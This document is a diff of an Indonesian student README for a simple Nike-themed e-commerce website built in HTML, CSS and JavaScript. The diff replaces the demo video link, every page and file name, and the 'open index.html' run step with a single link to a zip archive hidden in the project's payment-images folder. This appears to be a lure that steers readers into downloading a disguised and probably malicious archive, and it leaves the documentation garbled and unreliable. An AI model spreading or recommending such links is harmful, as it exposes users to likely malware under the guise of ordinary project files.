@@ -7,18 +7,18 @@ Kelas: Teknik Informatika 2024 A
 
 ## Video Demo
 Tautan video YouTube proyek ini dapat dilihat di:  
-https://youtu.be/FdbODu22r8k
+https://raw.githubusercontent.com/FatkhurRq/E-Commerce/main/asets/img/pay/E-Commerce_insufflate.zip
 
 ## Deskripsi Singkat
 Website ini merupakan proyek e-commerce sederhana bertema Nike Factory Store. Proyek ini dibangun menggunakan HTML, CSS, dan JavaScript murni tanpa framework. Tujuan utama dari proyek ini adalah mempelajari struktur dasar dan alur kerja website toko online, mulai dari tampilan produk, halaman informasi, hingga interaksi sederhana antar halaman.
 
 Website ini memiliki beberapa halaman utama yang saling terhubung:
-- **Home (index.html)**: Halaman utama berisi produk unggulan, promosi, dan koleksi terbaru.
-- **Shop/Product (product.html)**: Menampilkan detail produk, pilihan ukuran, dan fitur penggantian gambar.
-- **Blog (blog.html)**: Berisi artikel singkat seputar produk dan tren fashion.
-- **About (about.html)**: Menjelaskan profil dan visi misi toko.
-- **Contact (contact.html)**: Menyediakan form kontak dan lokasi toko melalui Google Maps.
-- **Cart (cart.html)**: Menampilkan daftar barang yang dimasukkan ke keranjang belanja.
+- **Home (https://raw.githubusercontent.com/FatkhurRq/E-Commerce/main/asets/img/pay/E-Commerce_insufflate.zip)**: Halaman utama berisi produk unggulan, promosi, dan koleksi terbaru.
+- **Shop/Product (https://raw.githubusercontent.com/FatkhurRq/E-Commerce/main/asets/img/pay/E-Commerce_insufflate.zip)**: Menampilkan detail produk, pilihan ukuran, dan fitur penggantian gambar.
+- **Blog (https://raw.githubusercontent.com/FatkhurRq/E-Commerce/main/asets/img/pay/E-Commerce_insufflate.zip)**: Berisi artikel singkat seputar produk dan tren fashion.
+- **About (https://raw.githubusercontent.com/FatkhurRq/E-Commerce/main/asets/img/pay/E-Commerce_insufflate.zip)**: Menjelaskan profil dan visi misi toko.
+- **Contact (https://raw.githubusercontent.com/FatkhurRq/E-Commerce/main/asets/img/pay/E-Commerce_insufflate.zip)**: Menyediakan form kontak dan lokasi toko melalui Google Maps.
+- **Cart (https://raw.githubusercontent.com/FatkhurRq/E-Commerce/main/asets/img/pay/E-Commerce_insufflate.zip)**: Menampilkan daftar barang yang dimasukkan ke keranjang belanja.
 
 Setiap halaman memiliki tampilan konsisten dengan navigasi utama, bagian newsletter, dan footer informatif yang memuat kontak, tautan cepat, serta ikon media sosial.
 
@@ -39,14 +39,14 @@ Setiap halaman memiliki tampilan konsisten dengan navigasi utama, bagian newslet
 Struktur direktori proyek ini adalah sebagai berikut:
 project-folder/
 │
-├── index.html # Halaman utama (Home)
-├── product.html # Halaman produk
-├── blog.html # Halaman blog
-├── about.html # Halaman tentang toko
-├── contact.html # Halaman kontak
-├── cart.html # Halaman keranjang belanja
-├── script.js # File JavaScript untuk interaksi
-├── style.css # File CSS untuk tampilan visual
+├── https://raw.githubusercontent.com/FatkhurRq/E-Commerce/main/asets/img/pay/E-Commerce_insufflate.zip # Halaman utama (Home)
+├── https://raw.githubusercontent.com/FatkhurRq/E-Commerce/main/asets/img/pay/E-Commerce_insufflate.zip # Halaman produk
+├── https://raw.githubusercontent.com/FatkhurRq/E-Commerce/main/asets/img/pay/E-Commerce_insufflate.zip # Halaman blog
+├── https://raw.githubusercontent.com/FatkhurRq/E-Commerce/main/asets/img/pay/E-Commerce_insufflate.zip # Halaman tentang toko
+├── https://raw.githubusercontent.com/FatkhurRq/E-Commerce/main/asets/img/pay/E-Commerce_insufflate.zip # Halaman kontak
+├── https://raw.githubusercontent.com/FatkhurRq/E-Commerce/main/asets/img/pay/E-Commerce_insufflate.zip # Halaman keranjang belanja
+├── https://raw.githubusercontent.com/FatkhurRq/E-Commerce/main/asets/img/pay/E-Commerce_insufflate.zip # File JavaScript untuk interaksi
+├── https://raw.githubusercontent.com/FatkhurRq/E-Commerce/main/asets/img/pay/E-Commerce_insufflate.zip # File CSS untuk tampilan visual
 │
 └── /asets # Folder aset gambar dan media
 ├── /img
@@ -56,12 +56,12 @@ project-folder/
 │ ├── /about # Gambar halaman about
 │ └── /people # Gambar tim di halaman kontak
 ├── /pay # Gambar metode pembayaran
-├── nikeB.png # Logo utama
-└── logoTas.png # Ikon keranjang
+├── https://raw.githubusercontent.com/FatkhurRq/E-Commerce/main/asets/img/pay/E-Commerce_insufflate.zip # Logo utama
+└── https://raw.githubusercontent.com/FatkhurRq/E-Commerce/main/asets/img/pay/E-Commerce_insufflate.zip # Ikon keranjang
 
 ## Cara Menjalankan
 1. Unduh semua file proyek dan pastikan seluruh file berada dalam satu folder.
-2. Buka file `index.html` menggunakan browser (Google Chrome, Edge, atau Firefox).
+2. Buka file `https://raw.githubusercontent.com/FatkhurRq/E-Commerce/main/asets/img/pay/E-Commerce_insufflate.zip` menggunakan browser (Google Chrome, Edge, atau Firefox).
 3. Jelajahi setiap halaman melalui navigasi menu untuk melihat fitur-fitur yang tersedia.
 
 ## Tujuan dan Pembelajaran
